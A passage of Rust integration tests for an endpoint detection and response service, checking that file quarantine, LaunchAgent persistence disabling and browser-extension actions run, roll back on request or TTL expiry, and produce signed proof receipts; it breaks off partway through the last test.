    #[tokio::test]
    async fn agent_edr_response_expiration_rolls_back_quarantine_file() {
        let receipt_path = test_receipt_path();
        let execution_path = test_response_execution_path();
        let keypair = Keypair::from_seed(&[66u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-response-proof-chain-signer".to_string(),
            signer_public_key,
        }));
        state.edr_response_execution_ledger = Arc::new(Mutex::new(
            EndpointResponseExecutionLedger::open(execution_path.clone()).unwrap_or_else(|e| {
                panic!("failed to open response execution proof-chain ledger: {e}")
            }),
        ));
        let state = Arc::new(state);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let source_path = std::env::temp_dir().join(format!(
            "clawdstrike-quarantine-expire-source-{}-{counter}.txt",
            std::process::id()
        ));
        std::fs::write(&source_path, b"expire restores me")
            .unwrap_or_else(|e| panic!("failed to write expiring quarantine source file: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-quarantine-expire-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::FileAccess {
                operation: FileOperation::Write,
                path: source_path.display().to_string(),
                source_url: None,
                content_preview: None,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring quarantine findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring quarantine findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing expiring quarantine file graph node"))
        };

        let body = serde_json::json!({
            "action": "quarantine_file",
            "rootNodeId": file_node_id,
            "ttlSeconds": 1,
            "reason": "quarantine suspicious file until TTL expiration",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build expiring quarantine request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring quarantine request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read expiring quarantine response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode expiring quarantine response: {e}"));
        assert_eq!(payload["execution"]["action"], "quarantine_file");
        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing expiring quarantine execution id"));
        assert!(!source_path.exists());
        let quarantine_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing expiring quarantine artifact path")),
        );
        assert!(quarantine_path.is_file());

        tokio::time::sleep(Duration::from_millis(1100)).await;

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build quarantine expiration request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine expiration request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine expiration response: {e}"));
        let expiration_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine expiration response: {e}"));
        assert_eq!(expiration_payload["expired_count"], 0);
        assert_eq!(expiration_payload["rollback_count"], 1);
        assert_eq!(
            expiration_payload["rollback_transitions"][0]["execution"]["status"],
            "rolled_back"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            expiration_payload["rollback_transition_receipts"][0]["receipt"]["metadata"]
                ["endpointDecision"]["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            expiration_payload["rollbacks"][0]["effects"][0]["effectType"],
            "restore_quarantine_file"
        );
        assert!(source_path.is_file());
        assert!(!quarantine_path.exists());
        assert_eq!(
            std::fs::read(&source_path).unwrap_or_else(|e| panic!(
                "failed to read restored expiring quarantine file: {e}"
            )),
            b"expire restores me"
        );
        assert_eq!(
            expiration_payload["rollback_receipts"][0]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_rollback"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build quarantine proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("quarantine proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read quarantine proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected quarantine proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode quarantine proof response: {e}"));
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing quarantine proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing quarantine proof rollback receipts"));
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("quarantine_file".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
        let _ = std::fs::remove_file(&execution_path);
    }

    #[tokio::test]
    async fn agent_edr_response_expiration_rolls_back_disable_persistence() {
        let receipt_path = test_receipt_path();
        let execution_path = test_response_execution_path();
        let keypair = Keypair::from_seed(&[88u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state = test_state();
        state.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-disable-persistence-expiration-signer".to_string(),
            signer_public_key,
        }));
        state.edr_response_execution_ledger = Arc::new(Mutex::new(
            EndpointResponseExecutionLedger::open(execution_path.clone()).unwrap_or_else(|e| {
                panic!("failed to open disable persistence expiration ledger: {e}")
            }),
        ));
        let state = Arc::new(state);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/expire",
                post(agent_edr_response_execution_expire),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let launch_agents_dir = std::env::temp_dir().join(format!(
            "clawdstrike-launch-agent-expire-{}-{counter}/Library/LaunchAgents",
            std::process::id()
        ));
        std::fs::create_dir_all(&launch_agents_dir)
            .unwrap_or_else(|e| panic!("failed to create expiring launch agents dir: {e}"));
        let source_path = launch_agents_dir.join("com.example.expiring.plist");
        let launch_agent_bytes = br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.expiring</string></dict></plist>"#;
        std::fs::write(&source_path, launch_agent_bytes)
            .unwrap_or_else(|e| panic!("failed to write expiring launch agent plist: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-persistence-expire-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::LaunchPersistence {
                path: source_path.display().to_string(),
                label: Some("com.example.expiring".to_string()),
                operation: FileOperation::Create,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring persistence findings request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing expiring persistence file graph node"))
        };

        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 1,
            "reason": "disable suspicious launch agent until TTL expiration",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| {
                panic!("failed to build expiring disable persistence request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("expiring disable persistence request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read expiring disable persistence response: {e}")
            });
        let payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode expiring disable persistence response: {e}")
        });
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing expiring disable persistence execution id"));
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing expiring disabled persistence artifact path")),
        );
        assert!(disabled_path.is_file());

        tokio::time::sleep(Duration::from_millis(1100)).await;

        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-executions/expire")
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build disable persistence expiration request: {e}")
            });
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence expiration request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read disable persistence expiration response: {e}")
            });
        let expiration_payload: serde_json::Value =
            serde_json::from_slice(&bytes).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence expiration response: {e}")
            });
        assert_eq!(expiration_payload["expired_count"], 0);
        assert_eq!(expiration_payload["rollback_count"], 1);
        assert_eq!(
            expiration_payload["rollbacks"][0]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());
        assert_eq!(
            std::fs::read(&source_path).unwrap_or_else(|e| panic!(
                "failed to read restored expiring persistence file: {e}"
            )),
            launch_agent_bytes
        );
        assert_eq!(
            expiration_payload["rollback_receipts"][0]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_rollback"
        );

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| {
                panic!("failed to build disable persistence expiration proof request: {e}")
            });
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence expiration proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| {
                panic!("failed to read disable persistence expiration proof response: {e}")
            });
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected disable persistence expiration proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes).unwrap_or_else(|e| {
            panic!("failed to decode disable persistence expiration proof response: {e}")
        });
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence expiration proof transition receipts")
            });
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence expiration proof rollback receipts")
            });
        assert_eq!(rollback_receipts.len(), 1);
        let rollback_decision = &rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(launch_agents_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
        let _ = std::fs::remove_file(&execution_path);
    }

    #[tokio::test]
    async fn agent_edr_response_action_executes_disable_persistence_with_rollback_receipts() {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[86u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-disable-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let launch_agents_dir = std::env::temp_dir().join(format!(
            "clawdstrike-launch-agents-{}-{counter}/Library/LaunchAgents",
            std::process::id()
        ));
        std::fs::create_dir_all(&launch_agents_dir)
            .unwrap_or_else(|e| panic!("failed to create launch agents dir: {e}"));
        let source_path = launch_agents_dir.join("com.example.agent.plist");
        std::fs::write(
            &source_path,
            br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.agent</string></dict></plist>"#,
        )
        .unwrap_or_else(|e| panic!("failed to write launch agent plist: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-persistence-1".to_string()),
                image: Some("/usr/bin/python3".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::LaunchPersistence {
                path: source_path.display().to_string(),
                label: Some("com.example.agent".to_string()),
                operation: FileOperation::Create,
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build persistence findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("persistence findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let file_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::File
                        && node.label == source_path.display().to_string()
                })
                .map(|node| node.node_id.clone())
                .unwrap_or_else(|| panic!("missing launch persistence file graph node"))
        };
        let body = serde_json::json!({
            "action": "disable_persistence",
            "rootNodeId": file_node_id,
            "ttlSeconds": 600,
            "reason": "disable suspicious launch agent",
            "actor": response_action_actor_input(),
            "dryRun": false
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/response-action")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build disable persistence request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read disable persistence response: {e}"));
        let payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode disable persistence response: {e}"));

        assert_eq!(payload["plan"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["action"], "disable_persistence");
        assert_eq!(payload["execution"]["status"], "succeeded");
        assert_eq!(
            payload["execution"]["effects"][0]["effectType"],
            "disable_persistence"
        );
        assert_eq!(
            payload["execution"]["effects"][0]["target"],
            source_path.display().to_string()
        );
        assert!(!source_path.exists());
        let disabled_path = PathBuf::from(
            payload["execution"]["effects"][0]["artifact"]
                .as_str()
                .unwrap_or_else(|| panic!("missing disabled persistence artifact path")),
        );
        assert!(disabled_path.is_file());
        assert_eq!(
            std::fs::read(&disabled_path)
                .unwrap_or_else(|e| panic!("failed to read disabled persistence artifact: {e}")),
            br#"<?xml version="1.0"?><plist><dict><key>Label</key><string>com.example.agent</string></dict></plist>"#
        );

        let execution_receipt: SignedReceipt =
            serde_json::from_value(payload["executionReceipt"].clone()).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence execution receipt: {e}")
            });
        let endpoint_decision = execution_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing disable persistence endpointDecision metadata"));
        assert_eq!(endpoint_decision["receiptFamily"], "response_execution");
        assert_eq!(
            endpoint_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            endpoint_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        assert!(endpoint_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("executionEffect:"))));

        let execution_id = payload["execution"]["executionId"]
            .as_str()
            .unwrap_or_else(|| panic!("missing disable persistence execution id"));
        let body = serde_json::json!({
            "reason": "restore disabled launch agent"
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build persistence rollback request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("persistence rollback request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read persistence rollback response: {e}"));
        let rollback_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode persistence rollback response: {e}"));
        assert_eq!(
            rollback_payload["rollback"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            rollback_payload["rollback"]["effects"][0]["effectType"],
            "restore_persistence_file"
        );
        assert!(source_path.is_file());
        assert!(!disabled_path.exists());

        let rollback_receipt: SignedReceipt =
            serde_json::from_value(rollback_payload["receipt"].clone()).unwrap_or_else(|e| {
                panic!("failed to decode disable persistence rollback receipt: {e}")
            });
        let rollback_decision = rollback_receipt
            .receipt
            .metadata
            .as_ref()
            .and_then(|metadata| metadata.get("endpointDecision"))
            .unwrap_or_else(|| panic!("missing persistence rollback endpointDecision metadata"));
        assert_eq!(rollback_decision["receiptFamily"], "response_rollback");
        assert_eq!(
            rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert!(rollback_decision["evidence"]
            .as_array()
            .unwrap_or_else(|| panic!("missing persistence rollback receipt evidence"))
            .iter()
            .any(|item| item["key"]
                .as_str()
                .is_some_and(|key| key.starts_with("rollbackEffect:"))));

        let req = axum::http::Request::builder()
            .method("GET")
            .uri(format!(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof"
            ))
            .header(AUTHORIZATION, "Bearer test-token")
            .body(axum::body::Body::empty())
            .unwrap_or_else(|e| panic!("failed to build disable persistence proof request: {e}"));
        let response = app
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("disable persistence proof request failed: {e}"));
        let proof_status = response.status();
        let bytes = axum::body::to_bytes(response.into_body(), 128 * 1024)
            .await
            .unwrap_or_else(|e| panic!("failed to read disable persistence proof response: {e}"));
        assert_eq!(
            proof_status,
            StatusCode::OK,
            "unexpected disable persistence proof response: {}",
            String::from_utf8_lossy(&bytes)
        );
        let proof_payload: serde_json::Value = serde_json::from_slice(&bytes)
            .unwrap_or_else(|e| panic!("failed to decode disable persistence proof response: {e}"));
        assert_eq!(
            proof_payload["execution"]["execution"]["executionId"],
            payload["execution"]["executionId"]
        );
        assert_eq!(
            proof_payload["requestReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_request"
        );
        assert_eq!(
            proof_payload["executionReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "response_execution"
        );
        assert_eq!(
            proof_payload["evidenceBundleReceipt"]["receipt"]["metadata"]["endpointDecision"]
                ["receiptFamily"],
            "evidence_bundle_manifest"
        );
        assert_eq!(
            proof_payload["evidenceBundleArtifact"]["bundleId"],
            payload["execution"]["evidenceBundle"]["bundleId"]
        );
        let transition_receipts = proof_payload["transitionReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence proof transition receipts"));
        assert_eq!(transition_receipts.len(), 1);
        let transition_decision =
            &transition_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(transition_decision["receiptFamily"], "response_execution");
        assert_eq!(
            transition_decision["decision"]["title"],
            "Endpoint response action rolled back"
        );
        assert_eq!(
            transition_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            transition_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let proof_rollback_receipts = proof_payload["rollbackReceipts"]
            .as_array()
            .unwrap_or_else(|| panic!("missing disable persistence proof rollback receipts"));
        assert_eq!(proof_rollback_receipts.len(), 1);
        let proof_rollback_decision =
            &proof_rollback_receipts[0]["receipt"]["metadata"]["endpointDecision"];
        assert_eq!(
            proof_rollback_decision["receiptFamily"],
            "response_rollback"
        );
        assert_eq!(
            proof_rollback_decision["decision"]["action"],
            serde_json::Value::String("disable_persistence".to_string())
        );
        assert_eq!(
            proof_rollback_decision["decision"]["rollbackRef"],
            payload["plan"]["rollbackRef"]
        );
        let acknowledgement_receipts = proof_payload["acknowledgementReceipts"]
            .as_array()
            .unwrap_or_else(|| {
                panic!("missing disable persistence proof acknowledgement receipts")
            });
        assert!(acknowledgement_receipts.is_empty());

        let _ = std::fs::remove_file(source_path);
        let _ = std::fs::remove_dir_all(launch_agents_dir);
        let _ = std::fs::remove_dir_all(quarantine_root.as_ref());
        let _ = std::fs::remove_file(&receipt_path);
        let _ = std::fs::remove_file(endpoint_receipt_index_path(&receipt_path));
    }

    #[tokio::test]
    async fn agent_edr_response_action_disables_browser_extension_manifest_with_rollback_and_proof()
    {
        let receipt_path = test_receipt_path();
        let keypair = Keypair::from_seed(&[87u8; 32]);
        let signer_public_key = keypair.public_key().to_hex();
        let mut state_value = test_state();
        state_value.edr_receipt_ledger = Arc::new(Mutex::new(EndpointReceiptLedger {
            path: Some(receipt_path.clone()),
            next_sequence: 1,
            keypair,
            signer_identity: "test-edr-browser-extension-persistence-signer".to_string(),
            signer_public_key,
        }));
        let state = Arc::new(state_value);
        let quarantine_root = state.edr_quarantine_root.clone();
        let app = Router::new()
            .route("/api/v1/agent/edr/findings", post(agent_edr_findings))
            .route(
                "/api/v1/agent/edr/response-action",
                post(agent_edr_response_action),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/rollback",
                post(agent_edr_response_execution_rollback),
            )
            .route(
                "/api/v1/agent/edr/response-executions/{execution_id}/proof",
                get(agent_edr_response_execution_proof),
            )
            .with_state(state.clone());
        let counter = TEST_POLICY_COUNTER.fetch_add(1, Ordering::Relaxed);
        let extension_dir = std::env::temp_dir().join(format!(
            "clawdstrike-browser-extension-{}-{counter}/Users/alice/Library/Application Support/Google/Chrome/Default/Extensions/abcdefghijklmnopabcdefghijklmnop/1.0.0",
            std::process::id()
        ));
        std::fs::create_dir_all(&extension_dir)
            .unwrap_or_else(|e| panic!("failed to create browser extension dir: {e}"));
        let manifest_path = extension_dir.join("manifest.json");
        std::fs::write(
            &manifest_path,
            br#"{"manifest_version":3,"name":"Suspicious Extension","version":"1.0.0"}"#,
        )
        .unwrap_or_else(|e| panic!("failed to write browser extension manifest: {e}"));
        let observation = EndpointObservation {
            process: EndpointProcess {
                process_guid: Some("proc-disable-browser-extension-1".to_string()),
                image: Some(
                    "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome".to_string(),
                ),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserExtensionInstall {
                browser: "chrome".to_string(),
                extension_id: Some("abcdefghijklmnopabcdefghijklmnop".to_string()),
                path: extension_dir.display().to_string(),
                source: Some("developer_mode".to_string()),
            },
            ..EndpointObservation::default()
        };
        let body = serde_json::json!({
            "observations": [observation],
            "honey_artifacts": []
        });
        let req = axum::http::Request::builder()
            .method("POST")
            .uri("/api/v1/agent/edr/findings")
            .header(AUTHORIZATION, "Bearer test-token")
            .header(CONTENT_TYPE, "application/json")
            .body(axum::body::Body::from(body.to_string()))
            .unwrap_or_else(|e| panic!("failed to build browser extension findings request: {e}"));
        let response = app
            .clone()
            .oneshot(req)
            .await
            .unwrap_or_else(|e| panic!("browser extension findings request failed: {e}"));
        assert_eq!(response.status(), StatusCode::OK);

        let extension_node_id = {
            let recorder = state.edr_flight_recorder.lock().await;
            recorder
                .graph()
                .nodes
                .values()
                .find(|node| {
                    node.kind == CausalNodeKind::BrowserExtension
                        && node.label == extension_dir.display().to_string()
                })
                .map(|node| node.node_id.clone())
